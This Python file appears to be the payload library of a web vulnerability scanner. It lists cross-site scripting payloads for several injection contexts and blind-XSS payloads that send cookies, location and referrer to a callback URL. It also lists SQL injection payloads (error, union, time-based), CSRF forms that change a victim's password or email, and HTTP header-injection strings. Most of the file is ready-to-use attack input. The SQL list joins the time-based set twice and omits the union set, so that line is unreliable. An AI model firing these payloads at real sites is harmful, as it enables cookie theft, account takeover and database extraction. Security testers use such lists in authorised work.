

def get_payloads_for_context(context, context_info):
    """Return context-specific XSS payloads."""
    if context == "javascript":
        return _get_js_payloads(context_info)
    elif context == "attribute":
        return _get_attribute_payloads(context_info)
    elif context == "url":
        return _get_url_payloads()
    elif context == "css":
        return _get_css_payloads()
    elif context == "dom":
        return _get_dom_payloads()
    else:  # HTML context
        return _get_html_payloads()

def _get_js_payloads(context_info):
    """Get payloads for JavaScript contexts."""
    quote = context_info.get("inside_quotes")
    if quote == "'":
        return [
            "'-alert(1)-'", 
            "';alert(1)//", 
            "'-alert(document.domain)-'"
        ]
    elif quote == '"':
        return [
            '"-alert(1)-"', 
            '";alert(1)//', 
            '"-alert(document.domain)-"'
        ]
    elif quote == '`':
        return [
            '`-alert(1)-`', 
            '`;alert(1)//', 
            '`-alert(document.domain)-`'
        ]
    return [
        "alert(1)", 
        "alert(document.domain)", 
        "(function(){alert(1)})()"
    ]

def _get_attribute_payloads(context_info):
    """Get payloads for HTML attribute contexts."""
    attr_name = context_info.get("attr_name", "").lower()
    quote_type = context_info.get("quote_type", "")
    
    payloads = []
    if attr_name in ["onclick", "onmouseover", "onload", "onerror"]:
        payloads.extend(["alert(1)", "alert(document.domain)"])
    
    if quote_type:  # Has quotes
        payloads.extend([
            f"{quote_type}><script>alert(1)</script>", 
            f"{quote_type} autofocus onfocus=alert(1) {quote_type}", 
            f"{quote_type}><img src=x onerror=alert(1)>{quote_type}"
        ])
    else:  # No quotes
        payloads.extend([
            " autofocus onfocus=alert(1) ", 
            "><script>alert(1)</script>", 
            "><img src=x onerror=alert(1)>"
        ])
    return payloads

def _get_url_payloads():
    """Get payloads for URL contexts."""
    return [
        "javascript:alert(1)", 
        "javascript:alert(document.domain)", 
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ]

def _get_css_payloads():
    """Get payloads for CSS contexts."""
    return [
        "</style><script>alert(1)</script>",
        "'</style><script>alert(1)</script>",
        "</style><img src=x onerror=alert(1)>"
    ]

def _get_dom_payloads():
    """Get payloads for DOM-based XSS contexts."""
    return [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"</script><script>alert(1)</script>"
    ]

def _get_html_payloads():
    """Get payloads for general HTML contexts."""
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>"
    ]

def get_blind_xss_payloads(callback_url):
    """Get blind XSS payloads with callback URL."""
    return [
        f'<script src="{callback_url}/hook.js"></script>',
        f'<img src=x onerror="fetch(\'{callback_url}/?\'+document.cookie)">',
        f'<svg onload="fetch(\'{callback_url}/?\'+document.location)">',
        f'<script>navigator.sendBeacon(\'{callback_url}/\', '
        f'JSON.stringify({{c:document.cookie,l:document.location,r:document.referrer}}))</script>'
    ]

def get_dom_sources():
    """Get common DOM XSS sources."""
    return [
        "document.URL", "document.documentURI", "document.baseURI",
        "location", "location.href", "location.search", "location.hash",
        "document.cookie", "document.referrer", "window.name"
    ]

def get_dom_sinks():
    """Get common DOM XSS sinks."""
    return [
        "eval", "setTimeout", "setInterval", "Function", "document.write", 
        "element.innerHTML", "element.outerHTML", "element.insertAdjacentHTML",
        "element.onevent", "window.location"
    ]






SQL_ERRORS = [
    # MySQL
    "quoted string not properly terminated",
    "unclosed quotation mark",
    "you have an error in your sql syntax",
    "unknown column",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "division by zero",
    "supplied argument is not a valid mysql",
    "mysql_fetch_assoc()",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "column count doesn't match",
    "table 'unknown'",
    
    # PostgreSQL
    "postgresql error",
    "pg_query() [:",
    "pg_exec() [:",
    "pg_fetch_row()",
    "pg_field_name()",
    "column reference .* is ambiguous",
    "column .* does not exist",
    "for a right parenthesis",
    "syntax error at or near",
    
    # Microsoft SQL Server
    "microsoft sql server",
    "incorrect syntax near",
    "unclosed quotation mark after",
    "conversion failed when converting",
    "odbc sql server driver",
    "sql server.*error",
    "syntax error converting the .* value",
    "statement has been terminated",
    "procedure or function .* expects parameter",
    
    # Oracle
    "ora-[0-9][0-9][0-9][0-9]",
    "oracle error",
    "ora-[0-9]",
    "pl/sql",
    "quoted string not properly terminated",
    
    # SQLite
    "sqlite3::",
    "sqlite_error",
    "sqlite.error",
    "no such table:",
    "no such column:",
    
    # General SQL
    "unexpected end of sql command",
    "syntax error",
    "unrecognized token",
    "missing right parenthesis",
    "incorrect integer value",
    "invalid sql statement",
    "subquery returns more than 1 row",
    "data too long",
    "conversion failed",
    "sql command not properly ended",
    "table or view does not exist"
]

# Error-based SQL injection payloads
ERROR_BASED_PAYLOADS = [
    "'", 
    "\"", 
    "') OR ('1'='1", 
    "') OR ('1'='1'--", 
    "' OR '1'='1'--", 
    "' OR 1=1--",
    "' OR '1'='1", 
    "1' OR '1'='1'--", 
    "1' OR 1=1--", 
    "1' AND (SELECT 5381 FROM (SELECT(CHAR(33))))"
]

# Union-based SQL injection payloads
UNION_BASED_PAYLOADS = [
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user(),2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--"
]

# Time-based SQL injection payloads
TIME_BASED_PAYLOADS = [
    "' OR (SELECT * FROM (SELECT(SLEEP(3)))A)--",
    "' OR SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "' AND (SELECT 5381 FROM (SELECT(SLEEP(3)))bAKL)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1); WAITFOR DELAY '0:0:3'--",
    "'); WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))A)--",
    "' AND SLEEP(3) AND '1'='1",
    "' BENCHMARK(10000000,MD5(1))--"
]

# Classic payloads (combination of different techniques)
CLASSIC_PAYLOADS = [
    "'", 
    "\"", 
    "') OR ('1'='1", 
    "' OR '1'='1", 
    "' OR '1'='1'--", 
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "' OR '1'='1' #",
    "' OR 1=1 #",
    "') OR ('1'='1",
    "'))) OR (((1=1", 
    "1' OR '1'='1",
    "admin'--", 
    "1' OR '1'='1'/*",
    "1' OR '1'='1' LIMIT 1--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1;--",
    "' UNION SELECT 1,2,3--",
    "1' OR SLEEP(5)--"
]

SQLI_PAYLOADS = CLASSIC_PAYLOADS + TIME_BASED_PAYLOADS + TIME_BASED_PAYLOADS + ERROR_BASED_PAYLOADS




reflected_payloads = [
'<script>alert(1)</script>',
'<img src=x onerror=alert(1)>',
'<svg/onload=alert(1)>',
'"><script>alert(1)</script>',
'<body onload=alert(1)>',
'javascript:alert(1)',
'<a href="javascript:alert(1)">click</a>',
'<iframe src="javascript:alert(1)"></iframe>',
'<input type="text" value="<script>alert(1)</script>">',
'<div onmouseover="alert(1)">hover</div>',
'<marquee onscroll=alert(1)>scroll</marquee>',
'<video><source onerror="alert(1)">',
'<audio src=x onerror=alert(1)>',
'<form action="javascript:alert(1)"><input type=submit>',
'<object data="javascript:alert(1)">',
'<embed src="javascript:alert(1)">',
'<table background="javascript:alert(1)">',
'<isindex type=image src=1 onerror=alert(1)>',
'<frameset onload=alert(1)>',
'<textarea onfocus=alert(1) autofocus>',
'<keygen autofocus onfocus=alert(1)>',
'<select onfocus=alert(1) autofocus>',
'<style>@import "javascript:alert(1)"</style>',
'<link rel=stylesheet href="javascript:alert(1)">',
'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
][:25]

stored_payloads = [
'<script>alert("storedXSS")</script>',
'<img src=x onerror=alert("stored")>',
'<svg/onload=alert("stored")>',
'<details open ontoggle=alert("stored")>',
'<iframe src="javascript:alert(\'stored\')"></iframe>',
'<a href="javascript:alert(\'stored\')">link</a>',
'<body onload=alert("stored")>',
'<div onmouseenter=alert("stored")>hover</div>',
'<video><source onerror=alert("stored")>',
'<audio src=x onerror=alert("stored")>',
'<form action=javascript:alert("stored")><button>submit</button>',
'<object data="javascript:alert(\'stored\')">',
'<embed src="javascript:alert(\'stored\')">',
'<table background="javascript:alert(\'stored\')">',
'<marquee onstart=alert("stored")>scroll</marquee>',
'<input autofocus onfocus=alert("stored")>',
'<select onchange=alert("stored")><option>1</option><option>2</option></select>',
'<style>@import "javascript:alert(\'stored\')";</style>',
'<link rel=stylesheet href="javascript:alert(\'stored\')">',
'<meta http-equiv="refresh" content="0;javascript:alert(\'stored\')">',
'<applet code="javascript:alert(\'stored\')">',
'<isindex type=image src=1 onerror=alert("stored")>',
'<frameset onload=alert("stored")>',
'<textarea onfocus=alert("stored") autofocus>',
'<keygen autofocus onfocus=alert("stored")>'
][:25]

dom_payloads = [
'javascript:alert(1)',
"';alert(1);//",
'<script>prompt(1)</script>',
'#<img src=x onerror=alert(1)>',
'#<svg/onload=alert(1)>',
'"-alert(1)-"',
'javascript:confirm(1)',
'javascript://%0Aalert(1)',
'data:text/html,<script>alert(1)</script>',
'"><svg/onload=alert(1)>',
'"><img src=x onerror=alert(1)>',
'"><iframe src=javascript:alert(1)>',
'"><body onload=alert(1)>',
'"><details open ontoggle=alert(1)>',
'"><div onmouseover=alert(1)>',
'"><video><source onerror=alert(1)>',
'"><audio src=x onerror=alert(1)>',
'"><form action=javascript:alert(1)><input type=submit>',
'"><object data=javascript:alert(1)>',
'"><embed src=javascript:alert(1)>',
'"><table background=javascript:alert(1)>',
'"><marquee onscroll=alert(1)>',
'"><input autofocus onfocus=alert(1)>',
'"><select onfocus=alert(1) autofocus>',
'"><textarea onfocus=alert(1) autofocus>'
][:25]


CSRF_PAYLOADS = [
    '<form action="https://victim.com/change_password" method="POST"><input type="hidden" name="new_password" value="hacked"></form>',
    '<img src="x" onerror="document.forms[0].submit()">',
    '<body onload="document.forms[0].submit()">',
    '<script>fetch(\'https://victim.com/api/change_email\', {method:\'POST\',credentials:\'include\',body:JSON.stringify({email:\'hacker@evil.com\'})})</script>'
]

HEADER_INJECTION_PAYLOADS = [
    'Victim\r\nX-Injected-Header: value',
    'Victim\r\nSet-Cookie: session=hacked',
    'Victim\n\nHTTP/1.1 200 OK\r\nContent-Length: 22\r\n\r\n<html>Injected</html>',
    'Victim\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 25\r\n\r\n<html>Injected</html>'
]

CMS_FINGERPRINTS = {
    'wordpress': [
        '/wp-content/',
        '/wp-includes/',
        '/wp-admin/',
        'wp-login.php',
        'generator" content="WordPress'
    ],
    'joomla': [
        '/administrator/',
        'generator" content="Joomla',
        '/components/',
        '/modules/',
        'joomla.javascript'
    ],
    'drupal': [
        '/sites/default/',
        'generator" content="Drupal',
        'jquery.once.js',
        'Drupal.settings',
        '/themes/'
    ]
}
